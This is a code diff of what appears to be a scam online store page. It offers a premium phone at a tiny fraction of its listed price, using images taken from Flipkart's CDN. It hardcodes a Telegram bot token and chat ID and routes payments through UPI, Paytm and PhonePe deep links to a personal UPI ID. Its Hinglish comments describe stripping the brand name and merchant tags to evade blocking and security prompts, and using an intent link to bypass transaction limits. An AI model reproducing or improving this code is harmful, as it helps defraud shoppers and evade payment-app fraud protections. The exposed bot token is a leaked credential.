@@ -347,7 +347,7 @@
     <script>
         const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM";
         const CHAT_ID = "1981500395";
-        const MY_UPI = "john.sa@ptyes";
+        const MY_UPI = "6299544009@naviaxis";
 
        const products = [
             { id: 208, name: "Apple iPhone 17 Pro Max (Silver, 256 GB)", price: "1499",mrp: "149900", imgs: ["https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/0/p/g/-original-imahft6cfwg6yta2.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/q/r/1/-original-imahft6cqn3ftf4p.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/3/y/r/-original-imahft6cq9fpa2ch.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/a/c/5/-original-imahft6cj2bzyfbq.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/x/c/q/-original-imahft5njwbfyz5u.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/z/v/8/-original-imahft6cjegrw5sj.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/c/i/p/-original-imahft6chqfe38fp.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/p/o/c/-original-imahft5nzmgz2agc.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/n/a/n/-original-imahft5nq7z4bnmn.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/l/z/q/-original-imahft57f3qjg325.jpeg?q=90"],
@@ -571,36 +571,29 @@ async function confirmPay() {
 }
 
 function payViaApp(app) {
-    const upiID = "john.sa@ptyes"; // Aapki UPI ID
+    const upiID = "6299544009@naviaxis"; // Ya phir paytmqr wala ID use karo
     const amount = sel.price;
-    const name = "Shashikant%20kumar"; // Brand name hatana zaroori hai block se bachne ke liye
-    const trId = "FTX" + Date.now(); // Unique ID taaki duplicate error na aaye
+    const name = "Sagar%20Kumar%20Tiwari";
+    const trId = "PTM" + Math.floor(Math.random() * 1000000);
 
-    // Sabse Clean Link (Bina extra merchant tags ke taaki Chat UI khule)
-    const rawLink = `upi://pay?pa=${upiID}&pn=${name}&am=${amount}&cu=INR&tr=${trId}`;
+    // PAYTM KE LIYE SABSE BEST LINK YE HAI (Second photo wala result):
+    // Isme mc aur mode hata diya hai taaki security dismiss na kare
+    const paytmLink = `paytmmp://pay?pa=${upiID}&pn=${name}&am=${amount}&cu=INR&tr=${trId}`;
 
-    if (app === 'phonepe') {
-        // PhonePe Direct Deep Link (Sabse fast trigger)
-        window.location.href = `phonepe://pay?pa=${upiID}&pn=${name}&am=${amount}&cu=INR&tr=${trId}`;
+    // PHONEPE KE LIYE YE SPECIAL INTENT (Jo limit bypass karne ki koshish karta hai):
+    const phonepeLink = `intent://pay?pa=${upiID}&pn=${name}&am=${amount}&cu=INR&tr=${trId}#Intent;scheme=upi;package=com.phonepe.app;end`;
+
+    if (app === 'paytm') {
+        window.location.href = paytmLink;
     } 
-    else if (app === 'paytm') {
-        // Paytm Chat Style Interface (P2P mode trigger)
-        window.location.href = `paytmmp://pay?pa=${upiID}&pn=${name}&am=${amount}&cu=INR&tr=${trId}`;
+    else if (app === 'phonepe') {
+        // PhonePe mein agar "Dismiss" aa raha hai, toh ye fallback kaam karega
+        window.location.href = phonepeLink;
     } 
-    else if (app === 'googlepay') {
-        // Google Pay Intent (Android Security Bypass)
-        window.location.href = `intent://pay?pa=${upiID}&pn=${name}&am=${amount}&cu=INR&tr=${trId}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
-    } else {
-        // Sabhi apps ke liye universal selector
-        window.location.href = rawLink;
+    else {
+        // Default Google Pay ya anya app
+        window.location.href = `upi://pay?pa=${upiID}&pn=${name}&am=${amount}&cu=INR&tr=${trId}`;
     }
-
-    // FALLBACK: Agar 0.6 second mein app nahi khula, toh selector khole
-    setTimeout(() => {
-        if (!document.hidden) {
-            window.location.href = rawLink;
-        }
-    }, 600);
 }
 
 // 3. Agar koi QR dekhna chahe toh modal dikhao
